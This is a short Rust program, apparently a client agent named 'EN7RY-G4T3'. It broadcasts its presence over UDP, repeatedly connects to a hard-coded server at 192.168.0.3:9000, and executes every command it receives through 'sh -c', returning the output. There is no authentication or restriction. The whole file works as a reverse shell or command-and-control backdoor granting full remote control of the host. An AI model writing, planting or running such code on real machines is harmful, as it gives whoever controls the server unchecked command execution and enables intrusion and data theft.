use std::net::{UdpSocket, TcpStream};
use std::io::{Read, Write};
use std::thread;
use std::time::Duration;

fn main() {
    // --- 1. Отправка UDP broadcast для автообнаружения ---
    let udp_socket = UdpSocket::bind("0.0.0.0:0").expect("Cannot bind UDP socket");
    udp_socket.set_broadcast(true).expect("Cannot enable broadcast");

    thread::spawn(move || {
        loop {
            let msg = "EN7RY-G4T3_DISCOVER: Laptop_1";
            udp_socket.send_to(msg.as_bytes(), "255.255.255.255:8888")
                .expect("Failed to send broadcast");
            thread::sleep(Duration::from_secs(5));
        }
    });

    // --- 2. Подключение по TCP к серверу ---
    let server_ip = "192.168.0.3:9000"; // IP главного ноутбука
    let mut stream = loop {
        match TcpStream::connect(server_ip) {
            Ok(s) => break s,
            Err(_) => {
                println!("Waiting for server...");
                thread::sleep(Duration::from_secs(2));
            }
        }
    };

    println!("Connected to EN7RY-G4T3 Server via TCP!");

    // --- 3. Получение команд ---
    let mut buf = [0u8; 1024];
    loop {
        let bytes_read = stream.read(&mut buf).expect("Failed to read from server");
        if bytes_read == 0 {
            continue;
        }
        let cmd = String::from_utf8_lossy(&buf[..bytes_read]);
        println!("Received command: {}", cmd);

        // Выполняем команду и отправляем результат обратно
        let output = std::process::Command::new("sh")
            .arg("-c")
            .arg(cmd.trim())
            .output()
            .expect("Failed to execute command");

        let response = if output.status.success() {
            format!("SUCCESS: {}", String::from_utf8_lossy(&output.stdout))
        } else {
            format!("ERROR: {}", String::from_utf8_lossy(&output.stderr))
        };

        stream.write_all(response.as_bytes()).expect("Failed to send response");
    }
}
